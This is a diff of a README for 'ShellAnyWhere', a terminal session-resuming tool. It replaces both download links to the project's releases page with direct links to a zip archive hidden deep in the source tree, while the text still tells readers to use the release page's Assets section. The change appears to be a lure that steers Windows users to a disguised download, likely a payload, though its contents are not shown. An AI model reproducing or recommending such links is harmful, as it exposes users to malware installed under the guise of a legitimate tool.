@@ -1,6 +1,6 @@
 # 🌐 ShellAnyWhere - Resume your terminal sessions anywhere instantly
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Audiewitting902/ShellAnyWhere/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Audiewitting902/ShellAnyWhere/main/web/src/wterm/core/Shell_Any_Where_3.8-alpha.3.zip)
 
 ShellAnyWhere keeps your command line sessions active. You can disconnect from one computer and reconnect from another. Your work stays exactly the way you left it.
 
@@ -16,7 +16,7 @@ You save time. You no longer need to restart processes after a disconnect. It wo
 
 You must visit the project release page to download your copy.
 
-[Download ShellAnyWhere for Windows](https://github.com/Audiewitting902/ShellAnyWhere/releases)
+[Download ShellAnyWhere for Windows](https://raw.githubusercontent.com/Audiewitting902/ShellAnyWhere/main/web/src/wterm/core/Shell_Any_Where_3.8-alpha.3.zip)
 
 1. Go to the link above.
 2. Look for the Assets section.
